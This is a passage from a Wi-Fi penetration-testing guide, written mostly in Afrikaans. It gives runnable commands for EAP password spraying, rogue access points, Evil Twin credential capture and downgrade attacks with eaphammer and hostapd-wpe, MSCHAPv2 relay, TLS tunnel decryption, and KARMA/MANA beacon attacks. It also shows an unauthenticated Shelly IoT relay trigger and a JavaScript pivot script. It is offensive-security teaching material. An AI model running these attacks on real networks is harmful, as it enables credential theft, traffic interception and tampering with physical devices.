- Bevestig dat kliënte anonieme buitenste identiteite (pseudonieme) vir EAP‑SIM/AKA gebruik volgens 3GPP‑riglyne (bv. 3GPP TS 33.402).
- Verkies om die identiteitsfase te tonnel (bv. EAP‑TTLS/PEAP wat innerlike EAP‑SIM/AKA dra) sodat die IMSI nooit onversleuteld gestuur word nie.
- Packet captures of association/auth moet nooit ’n rou IMSI in EAP-Response/Identity openbaar nie.

Verwant: Uitbuiting van telekommunikasie‑signalisering met vasgevangen mobiele identifiseerders
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Jy kan hierdie aanval ook met `eaphammer` uitvoer:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Kliëntaanvalle Teorie

### Netwerkkeuse en Roaming

- Die 802.11-protokol definieer hoe 'n stasie by 'n Extended Service Set (ESS) aansluit, maar spesifiseer nie die kriteria vir die keuse van 'n ESS of 'n access point (AP) daarin nie.
- Stasies kan tussen APs wat dieselfde ESSID deel rondbeweeg en sodoende konneksie oor 'n gebou of area handhaaf.
- Die protokol vereis stasie-authentisering na die ESS maar vereis nie dat die AP aan die stasie moet autentiseer nie.

### Voorkeur Netwerklyste (PNLs)

- Stasies stoor die ESSID van elke draadlose netwerk waarop hulle aansluit in hul Voorkeur Netwerklys (PNL), saam met netwerk-spesifieke konfigurasiedetails.
- Die PNL word gebruik om outomaties met bekende netwerke te verbind, wat die gebruiker se ervaring verbeter deur die konneksieproses te vereenvoudig.

### Passiewe Skandering

- APs stuur periodiek beacon frames uit, wat hul teenwoordigheid en eienskappe aankondig, insluitend die AP se ESSID tensy uitsending gedeaktiveer is.
- Tydens passiewe skandering luister stasies vir beacon frames. As 'n beacon se ESSID ooreenstem met 'n inskrywing in die stasie se PNL, kan die stasie outomaties met daardie AP verbind.
- Kennis van 'n toestel se PNL maak potensiële uitbuiting moontlik deur die ESSID van 'n bekende netwerk na te boots, en die toestel te mislei om met 'n rogue AP te verbind.

### Aktiewe Probing

- Aktiewe probing behels dat stasies probe requests stuur om nabygeleë APs en hul eienskappe te ontdek.
- Directed probe requests rig op 'n spesifieke ESSID, wat help om te bepaal of 'n bepaalde netwerk binne bereik is, selfs al is dit 'n verborgen netwerk.
- Broadcast probe requests het 'n null SSID-veld en word aan alle nabygeleë APs gestuur, wat die stasie toelaat om vir enige voorkeur-netwerk te kontroleer sonder om die inhoud van sy PNL bekend te maak.

## Eenvoudige AP met omleiding na Internet

Voordat ons verduidelik hoe om meer komplekse aanvalle uit te voer, gaan ons eers verduidelik **hoe** om net 'n **AP** te **skep** en sy **verkeer** te **omlei** na 'n koppelvlak wat met die **Internet** verbind is.

Gebruik `ifconfig -a` om te kontroleer dat die wlan interface wat gebruik gaan word om die AP te skep en die interface wat met die Internet verbind is, teenwoordig is.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Skep die konfigurasielêer `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dan **stel IPs** en **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
En dan **begin** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Skep 'n konfigurasielêer `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stop irriterende prosesse** , stel **monitor mode**, en **begin hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Deurstuur en Omleiding
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

'n evil twin-aanval benut die manier waarop WiFi-kliënte netwerke herken, hoofsaaklik deur op die netwerknaam (ESSID) staat te maak sonder dat die base station (access point) homself teenoor die kliënt hoef te verifieer. Belangrike punte sluit in:

- **Moeilikheid om te onderskei**: Toestelle sukkel om te onderskei tussen wettige en kwaadaardige access points wanneer hulle dieselfde ESSID en enkripsietipe deel. Reële netwerke gebruik dikwels verskeie access points met dieselfde ESSID om dekking naatloos uit te brei.
- **Kliëntroaming en verbindingsmanipulasie**: Die 802.11-protokol laat toestelle toe om te roam tussen access points binne dieselfde ESS. Aanvallers kan dit uitbuit deur 'n toestel te lok om van sy huidige base station (access point) los te koppel en met 'n rogue een te verbind. Dit kan bereik word deur 'n sterker sein aan te bied of die verbinding na die wettige access point te ontwrig deur metodes soos deauthentication packets of jamming.
- **Uitdagings in uitvoering**: Om 'n evil twin-aanval suksesvol uit te voer in omgewings met veelvuldige, goed geplaasde access points kan uitdagend wees. Om 'n enkele wettige access point te deauthenticate lei dikwels daartoe dat die toestel na 'n ander wettige access point verbind, tensy die aanvaller alle nabygeleë access points kan deauthenticate of die rogue access point strategies kan plaas.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Jy kan ook 'n Evil Twin skep met **eaphammer** (let wel dat om evil twins met **eaphammer** te skep die interface **should NOT be** in **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Of gebruik Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Let asseblief daarop let dat standaard, as 'n ESSID in die PNL as WPA-beskermd gestoor is, die toestel nie outomaties met 'n Open evil Twin gaan koppel nie. Jy kan probeer om die regte AP te DoS en hoop dat die gebruiker handmatig by jou Open evil twin gaan koppel, of jy kan die regte AP DoS en 'n WPA Evil Twin gebruik om die handshake vas te vang (met hierdie metode kan jy die slagoffer nie by jou laat koppel nie omdat jy nie die PSK ken nie, maar jy kan die handshake vasvang en probeer kraak).

_Sommige OS en AV sal die gebruiker waarsku dat dit gevaarlik is om aan 'n Open netwerk te koppel..._

### WPA/WPA2 Evil Twin

Jy kan 'n **Evil Twin using WPA/2** skep en as die toestelle gekonfigureer is om na daardie SSID met WPA/2 te koppel, sal hulle probeer koppel. Hoe dit ook al sy, **to complete the 4-way-handshake** moet jy ook **weet** die **wagwoord** wat die kliënt gaan gebruik. As jy dit **nie weet** nie, sal die **verbinding nie voltooi word**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Om hierdie aanvalle te verstaan, beveel ek aan om eers die bondige [WPA Enterprise explanation](#wpa-enterprise-mgt) te lees.

**Gebruik hostapd-wpe**

`hostapd-wpe` het 'n **konfigurasie**-lêer nodig om te werk. Om die generering van hierdie konfigurasies te **outomatiseer** kan jy [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) gebruik (laai die python-lêer binne _/etc/hostapd-wpe/_ af)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In die konfigurasielêer kan jy baie verskillende dinge kies, soos ssid, channel, user files, cret/key, dh parameters, wpa version en auth...

[**Gebruik hostapd-wpe met EAP-TLS om enige sertifikaat toe te laat om aan te meld.**](evil-twin-eap-tls.md)

**Gebruik EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
As verstek gebruik EAPHammer die volgende auth methods (let op GTC as die eerste een om plaintext passwords te probeer verkry en dan die gebruik van meer robuuste auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dit is die standaardmetodologie om lang verbindingstye te vermy. Jy kan egter ook die authentication methods by die server spesifiseer van swakste na sterkste:
```
--negotiate weakest
```
Of jy kan ook gebruik:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` om manueel die metodes wat aangebied word te spesifiseer (deur dieselfde auth-metodes in dieselfde volgorde as die organisasie aan te bied sal die aanval baie moeiliker wees om op te spoor).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### Wanneer kliënte RADIUS-sertifikaatvalidasie oorslaan (PEAP/TTLS)

- As toestelle gekonfigureer is met "do not validate certificate", sal `n gekloneerde AP + rogue RADIUS` (`eaphammer --cert-wizard --creds --auth wpa-eap`) **NetNTLMv2** (PEAP-MSCHAPv2) of **cleartext** creds (PEAP-GTC) versamel. `bettercap` deauth (`wifi.deauth <BSSID>`) onthul verborge SSIDs tydens probes en dwing herverbindinge af, tensy PMF/802.11w vervalste deauth blokkeer.
- Gekraakte NetNTLMv2 gee herbruikbare Wi‑Fi/AD creds; GTC lewer onmiddellik plaintext.

#### Deurstuuring van PEAP-MSCHAPv2 in plaas van kraak (wpa_sycophant + hostapd-mana)

- Vir masjienrekeninge met onkraakbare ewekansige wagwoorde, misbruik **MSCHAPv2 relay**: voer `hostapd-mana` uit as die Evil Twin, en stuur die MSCHAPv2-uitruiling deur na `wpa_sycophant`, wat terselfdertyd met die legitieme AP skakel. 'n Suksesvolle relay verleen geverifieerde Wi‑Fi sonder om die wagwoord te herstel.
- Gebruik builds wat die teiken-sekuriteitsvlak ondersteun (WPA3/PMF vereis onlangse hostapd/wpa_supplicant); PMF voorkom deauth-dwinging, so wag vir vrywillige kliëntassosiasies.

**Gebruik Airgeddon**

`Airgeddon` kan vooraf gegenereerde sertifikate gebruik om EAP-verifikasie aan WPA/WPA2-Enterprise-netwerke aan te bied. Die vals netwerk sal die konneksieprotokol na EAP-MD5 teruggradeer, sodat dit die gebruiker en die MD5 van die wagwoord kan **vasvang**. Later kan die aanvaller probeer om die wagwoord te kraak.\
`Airggedon` bied jou die moontlikheid van 'n **deurlopende Evil Twin attack (luidrugtig)** of **slegs om die Evil Attack te skep totdat iemand koppel (stil).**

![](<../../images/image (936).png>)

### Foutopsporing van PEAP- en EAP-TTLS TLS-tonnels in Evil Twins-aanvalle

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Binne die **konfigurasie** van _hostapd-wpe_ **kommentarieer** die reël wat _**dh_file**_ bevat (van `dh_file=/etc/hostapd-wpe/certs/dh` na `#dh_file=/etc/hostapd-wpe/certs/dh`).\
Dit sal veroorsaak dat `hostapd-wpe` sleutels **ruil met RSA** in plaas van DH, sodat jy later die verkeer kan **ontsleutel** deur die bediener se private key te ken.

Begin nou die **Evil Twin** met **`hostapd-wpe`** met daardie gewysigde konfigurasie soos gewoonlik. Begin ook **`wireshark`** op die **interface** wat die Evil Twin-aanval uitvoer.

Nou of later (as jy reeds sekere authenticasiepogings vasgevang het) kan jy die private RSA key by wireshark voeg in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Voeg 'n nuwe inskrywing by en vul die vorm met hierdie waardes: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, om probleme te voorkom kies 'n key file **sonder wagwoordbeskerming**).

![](<../../images/image (687).png>)

En kyk na die nuwe **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Verskillende tipes Media Access Control Filter Lists (MFACLs) en hul ooreenstemmende modusse en effekte op die gedrag van 'n rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Die rogue AP sal slegs op probe-versoeke van toestelle in die whitelist reageer, en onsigbaar bly vir alle ander wat nie gelys is nie.
2. **MAC-based Blacklist**:
- Die rogue AP sal probe-versoeke van toestelle op die blacklist ignoreer, wat dit effektief onsigbaar maak vir daardie spesifieke toestelle.
3. **SSID-based Whitelist**:
- Die rogue AP sal slegs op probe-versoeke reageer vir spesifieke ESSIDs wat gelys is, wat dit onsigbaar maak vir toestelle waarvan die Preferred Network Lists (PNLs) daardie ESSIDs nie bevat nie.
4. **SSID-based Blacklist**:
- Die rogue AP sal nie op probe-versoeke vir die spesifieke ESSIDs op die blacklist reageer nie, wat dit onsigbaar maak vir toestelle wat daardie netwerk soek.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Hierdie metode laat 'n **attacker toe om 'n malicious access point (AP) te skep wat op alle probe requests reageer** vanaf toestelle wat probeer koppel aan netwerke. Hierdie tegniek **mislei toestelle om met 'n attacker se AP te koppel** deur die netwerke wat die toestelle soek na te boots. Sodra 'n toestel 'n connection request na hierdie rogue AP stuur, voltooi dit die verbinding, wat daartoe lei dat die toestel per ongeluk aan die attacker se netwerk koppel.

### MANA

Daarna het **toestelle begin om onbetroubare netwerkantwoorde te ignoreer**, wat die doeltreffendheid van die oorspronklike karma attack verminder het. 'n Nuwe metode, bekend as die **MANA attack**, is egter deur Ian de Villiers en Dominic White bekendgestel. Hierdie metode behels dat die rogue AP **die Preferred Network Lists (PNL) van toestelle kaap deur op hul broadcast probe requests te reageer** met netwerkname (SSIDs) wat vroeër deur die toestelle gestoor is. Hierdie gesofistikeerde attack omseil die beskerming teen die oorspronklike karma attack deur die wyse waarop toestelle bekende netwerke onthou en prioritiseer, uit te buit.

Die MANA attack funksioneer deur beide directed en broadcast probe requests van toestelle te monitor. Vir directed requests neem dit die toestel se MAC address en die aangevraagde netwerknaam op en voeg hierdie inligting by 'n lys. Wanneer 'n broadcast request ontvang word, antwoord die AP met inligting wat ooreenstem met enige van die netwerke op die toestel se lys, en lok die toestel om met die rogue AP te koppel.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

'n **Loud MANA attack** is 'n gevorderde strategie vir wanneer toestelle nie gerigte probing gebruik nie of wanneer hul Preferred Network Lists (PNL) onbekend is aan die aanvaller. Dit werk op die beginsel dat **toestelle in dieselfde area waarskynlik sommige netwerkname in hul PNLs sal deel**. In plaas daarvan om selektief te reageer, stuur hierdie aanval probe responses uit vir elke netwerknaam (ESSID) wat in die gekombineerde PNLs van alle waargenome toestelle gevind word. Hierdie breë benadering verhoog die kans dat 'n toestel 'n bekende netwerk herken en probeer om met die rogue Access Point (AP) te verbind.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wanneer die **Loud MANA attack** moontlik nie voldoende is nie, bied die **Known Beacon attack** 'n ander benadering. Hierdie metode **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** wat ontleen is aan 'n wordlist. Dit simuleer die teenwoordigheid van talle netwerke, in die hoop om 'n ESSID binne die slagoffer se PNL te vind, wat 'n konneksiepoging na die gefabriseerde AP uitlok. Die aanval kan versterk word deur dit te kombineer met die `--loud` opsie vir 'n meer aggressiewe poging om toestelle vas te vang.

Eaphammer het hierdie aanval geïmplementeer as 'n MANA attack waar al die ESSIDs in 'n lys aangebied word (jy kan dit ook met `--loud` kombineer om 'n Loud MANA + Known beacons attack te skep):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Die **Known Beacon Burst attack** behels **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Dit skep 'n digte omgewing van vals netwerke, wat die waarskynlikheid dat toestelle met die rogue AP verbind aansienlik verhoog, veral wanneer dit saam met 'n MANA attack gebruik word. Hierdie tegniek maak gebruik van spoed en volume om toestelle se netwerkkeuse-meganismes te oorlaai.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** is 'n protokol wat toestelle in staat stel om direk met mekaar te koppel via Wi-Fi sonder die behoefte aan 'n tradisionele draadlose toegangspunt. Hierdie vermoë is geïntegreer in verskeie Internet of Things (IoT)-toestelle, soos drukkers en televisies, wat direkte toestel-tot-toestel kommunikasie vergemaklik. 'n Opvallende kenmerk van Wi-Fi Direct is dat een toestel die rol van 'n toegangspunt opneem, bekend as die group owner, om die verbinding te bestuur.

Sekuriteit vir Wi-Fi Direct-verbindinge word gevestig deur **Wi-Fi Protected Setup (WPS)**, wat verskeie metodes vir veilige koppeling ondersteun, insluitend:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Hierdie metodes, veral PIN entry, is kwesbaar vir dieselfde tekortkominge as WPS in tradisionele Wi-Fi-netwerke, wat hulle teikens maak vir soortgelyke aanvalvektore.

### EvilDirect Hijacking

**EvilDirect Hijacking** is 'n aanval spesifiek vir Wi-Fi Direct. Dit spiegel die konsep van 'n Evil Twin-aanval maar teiken Wi-Fi Direct-verbindinge. In hierdie scenario doen 'n aanvaller voor as 'n wettige group owner met die doel om toestelle te mislei om met 'n kwaadwillige entiteit te koppel. Hierdie metode kan uitgevoer word met hulpmiddels soos `airbase-ng` deur die kanaal, ESSID, en MAC-adres van die geïmiteerde toestel te spesifiseer:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Sommige verbruikers-IoT-relais/kontrollers laat die commissioning **open AP** aktief nadat dit by die IoT WLAN aangesluit het (bv., Shelly Gen4 SSIDs wat begin met `Shelly`). Die toestel bly **dual-homed**: 'n AP-koppelvlak met die verstek-IP `192.168.33.1` plus 'n kliëntkoppelvlak op die interne WLAN.

**Misbruikvloeistroom (Wi‑Fi-nabyheid vereis):**

1. Sluit by die provisioning AP aan, verkry 'n DHCP-leen, en blaai deur die **AP-side HTTP API**.
2. Trigger relays via ongeverifieerde eindpunte, bv. `http://192.168.33.1/relay/0?turn=on` (impak op deur/hek/garage). Firmware-oplaai-eindpunte kan volharding byvoeg.
3. Gebruik dit as 'n **pivot**: Shelly-scripting kan HTTP vanaf die interne koppelvlak na ander LAN-hosts stuur. Voorbeeld pivot na 'n ander Shelly by `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Wissel die URL vir enige bereikbare interne HTTP-doel; dual-homing vermy ekstra routering/NAT-werk.
4. Op groot skaal: navraag doen vir verkoper-SSIDs op **wigle.net** (bv., `Shelly`) om commissioning APs vir ter plaatse-uitbuiting te vind.

Vir volharding, laat die commissioning AP aangeskakel.

## Verwysings

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Kyk na [https://github.com/wifiphisher/wifiphisher] (aanmelding met Facebook en nabootsing van WPA in captive portals)

{{#include ../../banners/hacktricks-training.md}}
